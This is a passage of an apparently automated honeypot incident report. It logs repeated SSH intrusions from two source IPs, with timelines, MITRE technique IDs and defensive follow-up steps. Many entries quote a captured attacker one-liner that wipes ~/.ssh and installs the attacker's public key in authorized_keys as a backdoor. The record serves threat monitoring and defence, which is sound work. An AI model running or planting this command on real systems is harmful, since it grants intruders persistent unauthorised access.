| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:14:10` | `cowrie.session.connect` |
| `2026-04-23 21:14:10` | `cowrie.client.version` |
| `2026-04-23 21:14:10` | `cowrie.client.kex` |
| `2026-04-23 21:14:11` | `cowrie.login.success` |
| `2026-04-23 21:14:12` | `cowrie.session.params` |
| `2026-04-23 21:14:12` | `cowrie.command.input` |
| `2026-04-23 21:14:12` | `cowrie.command.failed` |
| `2026-04-23 21:14:12` | `cowrie.log.closed` |
| `2026-04-23 21:14:12` | `cowrie.session.params` |
| `2026-04-23 21:14:12` | `cowrie.command.input` |
| `2026-04-23 21:14:13` | `cowrie.session.file_download` |
| `2026-04-23 21:14:13` | `cowrie.log.closed` |
| `2026-04-23 21:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dac13b340fa

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:14 |
| **Last Seen** | 2026-04-23 21:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:14:15` | `cowrie.session.connect` |
| `2026-04-23 21:14:15` | `cowrie.client.version` |
| `2026-04-23 21:14:16` | `cowrie.client.kex` |
| `2026-04-23 21:14:16` | `cowrie.login.success` |
| `2026-04-23 21:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c28576e088b

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:15 |
| **Last Seen** | 2026-04-23 21:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:15:50` | `cowrie.session.connect` |
| `2026-04-23 21:15:50` | `cowrie.client.version` |
| `2026-04-23 21:15:51` | `cowrie.client.kex` |
| `2026-04-23 21:15:51` | `cowrie.login.success` |
| `2026-04-23 21:15:52` | `cowrie.session.params` |
| `2026-04-23 21:15:52` | `cowrie.command.input` |
| `2026-04-23 21:15:52` | `cowrie.command.failed` |
| `2026-04-23 21:15:52` | `cowrie.log.closed` |
| `2026-04-23 21:15:52` | `cowrie.session.params` |
| `2026-04-23 21:15:52` | `cowrie.command.input` |
| `2026-04-23 21:15:52` | `cowrie.session.file_download` |
| `2026-04-23 21:15:52` | `cowrie.log.closed` |
| `2026-04-23 21:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c984580cf53

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:15 |
| **Last Seen** | 2026-04-23 21:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:15:55` | `cowrie.session.connect` |
| `2026-04-23 21:15:55` | `cowrie.client.version` |
| `2026-04-23 21:15:55` | `cowrie.client.kex` |
| `2026-04-23 21:15:56` | `cowrie.login.success` |
| `2026-04-23 21:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b133764828

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:16 |
| **Last Seen** | 2026-04-23 21:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:16:45` | `cowrie.session.connect` |
| `2026-04-23 21:16:45` | `cowrie.client.version` |
| `2026-04-23 21:16:45` | `cowrie.client.kex` |
| `2026-04-23 21:16:46` | `cowrie.login.success` |
| `2026-04-23 21:16:46` | `cowrie.session.params` |
| `2026-04-23 21:16:46` | `cowrie.command.input` |
| `2026-04-23 21:16:46` | `cowrie.command.failed` |
| `2026-04-23 21:16:46` | `cowrie.log.closed` |
| `2026-04-23 21:16:47` | `cowrie.session.params` |
| `2026-04-23 21:16:47` | `cowrie.command.input` |
| `2026-04-23 21:16:47` | `cowrie.session.file_download` |
| `2026-04-23 21:16:47` | `cowrie.log.closed` |
| `2026-04-23 21:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ffee0c272e

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:16 |
| **Last Seen** | 2026-04-23 21:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:16:49` | `cowrie.session.connect` |
| `2026-04-23 21:16:49` | `cowrie.client.version` |
| `2026-04-23 21:16:50` | `cowrie.client.kex` |
| `2026-04-23 21:16:50` | `cowrie.login.success` |
| `2026-04-23 21:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c72ba1d497

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:17 |
| **Last Seen** | 2026-04-23 21:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:17:02` | `cowrie.session.connect` |
| `2026-04-23 21:17:02` | `cowrie.client.version` |
| `2026-04-23 21:17:02` | `cowrie.client.kex` |
| `2026-04-23 21:17:03` | `cowrie.login.success` |
| `2026-04-23 21:17:03` | `cowrie.session.params` |
| `2026-04-23 21:17:03` | `cowrie.command.input` |
| `2026-04-23 21:17:03` | `cowrie.command.failed` |
| `2026-04-23 21:17:03` | `cowrie.log.closed` |
| `2026-04-23 21:17:04` | `cowrie.session.params` |
| `2026-04-23 21:17:04` | `cowrie.command.input` |
| `2026-04-23 21:17:04` | `cowrie.session.file_download` |
| `2026-04-23 21:17:04` | `cowrie.log.closed` |
| `2026-04-23 21:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9308af025358

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:17 |
| **Last Seen** | 2026-04-23 21:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:17:07` | `cowrie.session.connect` |
| `2026-04-23 21:17:07` | `cowrie.client.version` |
| `2026-04-23 21:17:07` | `cowrie.client.kex` |
| `2026-04-23 21:17:08` | `cowrie.login.success` |
| `2026-04-23 21:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f3a714d4ff

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:18 |
| **Last Seen** | 2026-04-23 21:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:18:28` | `cowrie.session.connect` |
| `2026-04-23 21:18:28` | `cowrie.client.version` |
| `2026-04-23 21:18:29` | `cowrie.client.kex` |
| `2026-04-23 21:18:30` | `cowrie.login.success` |
| `2026-04-23 21:18:30` | `cowrie.session.params` |
| `2026-04-23 21:18:30` | `cowrie.command.input` |
| `2026-04-23 21:18:30` | `cowrie.command.failed` |
| `2026-04-23 21:18:30` | `cowrie.log.closed` |
| `2026-04-23 21:18:31` | `cowrie.session.params` |
| `2026-04-23 21:18:31` | `cowrie.command.input` |
| `2026-04-23 21:18:31` | `cowrie.session.file_download` |
| `2026-04-23 21:18:31` | `cowrie.log.closed` |
| `2026-04-23 21:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d219dd4742

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:18 |
| **Last Seen** | 2026-04-23 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:18:34` | `cowrie.session.connect` |
| `2026-04-23 21:18:34` | `cowrie.client.version` |
| `2026-04-23 21:18:34` | `cowrie.client.kex` |
| `2026-04-23 21:18:35` | `cowrie.login.success` |
| `2026-04-23 21:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f269348b94

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:19 |
| **Last Seen** | 2026-04-23 21:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:19:56` | `cowrie.session.connect` |
| `2026-04-23 21:19:56` | `cowrie.client.version` |
| `2026-04-23 21:19:57` | `cowrie.client.kex` |
| `2026-04-23 21:19:58` | `cowrie.login.success` |
| `2026-04-23 21:19:58` | `cowrie.session.params` |
| `2026-04-23 21:19:58` | `cowrie.command.input` |
| `2026-04-23 21:19:58` | `cowrie.command.failed` |
| `2026-04-23 21:19:58` | `cowrie.log.closed` |
| `2026-04-23 21:19:59` | `cowrie.session.params` |
| `2026-04-23 21:19:59` | `cowrie.command.input` |
| `2026-04-23 21:19:59` | `cowrie.session.file_download` |
| `2026-04-23 21:19:59` | `cowrie.log.closed` |
| `2026-04-23 21:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042a92bea9c4

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:20 |
| **Last Seen** | 2026-04-23 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:20:02` | `cowrie.session.connect` |
| `2026-04-23 21:20:02` | `cowrie.client.version` |
| `2026-04-23 21:20:02` | `cowrie.client.kex` |
| `2026-04-23 21:20:03` | `cowrie.login.success` |
| `2026-04-23 21:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a0366842eda

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:21 |
| **Last Seen** | 2026-04-23 21:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:21:20` | `cowrie.session.connect` |
| `2026-04-23 21:21:20` | `cowrie.client.version` |
| `2026-04-23 21:21:21` | `cowrie.client.kex` |
| `2026-04-23 21:21:21` | `cowrie.login.success` |
| `2026-04-23 21:21:22` | `cowrie.session.params` |
| `2026-04-23 21:21:22` | `cowrie.command.input` |
| `2026-04-23 21:21:22` | `cowrie.command.failed` |
| `2026-04-23 21:21:22` | `cowrie.log.closed` |
| `2026-04-23 21:21:22` | `cowrie.session.params` |
| `2026-04-23 21:21:22` | `cowrie.command.input` |
| `2026-04-23 21:21:22` | `cowrie.session.file_download` |
| `2026-04-23 21:21:22` | `cowrie.log.closed` |
| `2026-04-23 21:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d0e07f0c67

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:21 |
| **Last Seen** | 2026-04-23 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:21:25` | `cowrie.session.connect` |
| `2026-04-23 21:21:25` | `cowrie.client.version` |
| `2026-04-23 21:21:25` | `cowrie.client.kex` |
| `2026-04-23 21:21:26` | `cowrie.login.success` |
| `2026-04-23 21:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f28a9f616d9a

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:22 |
| **Last Seen** | 2026-04-23 21:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:22:12` | `cowrie.session.connect` |
| `2026-04-23 21:22:12` | `cowrie.client.version` |
| `2026-04-23 21:22:12` | `cowrie.client.kex` |
| `2026-04-23 21:22:13` | `cowrie.login.success` |
| `2026-04-23 21:22:13` | `cowrie.session.params` |
| `2026-04-23 21:22:13` | `cowrie.command.input` |
| `2026-04-23 21:22:13` | `cowrie.command.failed` |
| `2026-04-23 21:22:13` | `cowrie.log.closed` |
| `2026-04-23 21:22:14` | `cowrie.session.params` |
| `2026-04-23 21:22:14` | `cowrie.command.input` |
| `2026-04-23 21:22:14` | `cowrie.session.file_download` |
| `2026-04-23 21:22:14` | `cowrie.log.closed` |
| `2026-04-23 21:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a63550295d

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:22 |
| **Last Seen** | 2026-04-23 21:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:22:16` | `cowrie.session.connect` |
| `2026-04-23 21:22:16` | `cowrie.client.version` |
| `2026-04-23 21:22:17` | `cowrie.client.kex` |
| `2026-04-23 21:22:17` | `cowrie.login.success` |
| `2026-04-23 21:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae2d3414bf1

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:23 |
| **Last Seen** | 2026-04-23 21:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:23:57` | `cowrie.session.connect` |
| `2026-04-23 21:23:57` | `cowrie.client.version` |
| `2026-04-23 21:23:57` | `cowrie.client.kex` |
| `2026-04-23 21:23:58` | `cowrie.login.success` |
| `2026-04-23 21:23:59` | `cowrie.session.params` |
| `2026-04-23 21:23:59` | `cowrie.command.input` |
